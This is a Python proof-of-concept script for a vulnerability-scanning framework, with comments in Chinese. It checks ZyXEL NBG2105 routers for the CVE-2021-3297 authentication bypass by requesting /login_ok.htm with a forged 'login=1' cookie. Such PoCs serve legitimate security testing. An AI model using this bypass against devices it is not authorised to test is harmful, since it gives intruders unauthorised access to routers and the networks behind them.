from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin   

POC_NAME = "zyxel_nbg2105_bypass_auth"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class zyxel_nbg2105_bypass_auth(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0042',    # PoC的VID编号
            'vbid': '',
            'Name': 'zyxel_nbg2105_bypass_auth',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-10-22',    # PoC创建时间
            },

        'vul': {
            'Product': 'ZyXEL NBG2105 无线迷你旅行路由器',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '身份验证绕过',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                时尚、紧凑的 ZyXEL NBG2105 无线迷你旅行路由器提供了一种在旅途中同时在笔记本电脑、智能手机和平板电脑之间共享互联网访问的简便方法。远程攻击者通过构造恶意参数绕过身份验证登录设备。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-09-22',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,"/login_ok.htm")

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        location = ""
        resp = req(url, 'get', headers=header, allow_redirects=False)
        if resp is not None:
            location = resp.text
        if resp.status_code == 200 and "GMT" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight("[+] url: " + url + " 存在Zyxel NBG2105 身份验证绕过 CVE-2021-3297漏洞！！！")
        else:
            if verbose:
                highlight("[+] url: " + url + " 不存在Zyxel NBG2105 身份验证绕过 CVE-2021-3297漏洞！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)